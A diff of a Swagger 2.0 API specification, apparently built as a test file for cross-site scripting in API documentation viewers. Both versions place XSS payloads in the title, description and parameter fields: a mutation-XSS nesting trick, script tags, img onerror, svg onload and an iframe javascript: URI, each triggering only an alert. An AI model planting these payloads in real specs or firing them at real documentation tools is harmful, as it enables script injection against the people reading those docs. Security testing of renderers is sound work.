@@ -1,38 +1,31 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY Ravi
+  title: Vulnerable API Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("Hello I am Ravi5hanka") src=1>"></form>
-  version: production
-basePath: /JSSResource/
+    <script>alert('XSS Demo - Security Test')</script>
+    <img src=x onerror=alert('XSS-Triggered')>
+  version: 1.0.0
+host: vulnerable.example.com
+basePath: /v1
+schemes:
+  - http
 produces:
-  - application/xml
   - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
 paths:
-  /M0X0101:
+  /test/{input}:
     get:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - Ravi_XSS_D
-      operationId: findAccounts
-      summary: Finds all accounts
-  '/hack/hachid/{id}':
-    delete:
       parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("Hello I am Ravi5hanka") src=1>"></form>
-          format: int64
+        - name: input
           in: path
-          name: id
+          description: |
+            <svg/onload=alert('XSS-Param')>
+            <img src=1 onerror=alert(1)>
           required: true
-          type: integer
+          type: string
       responses:
         '200':
-          description: No response was specified
+          description: |
+            <iframe/src="javascript:alert('XSS-Response')">
+securityDefinitions:
+  basicAuth:
+    type: basic
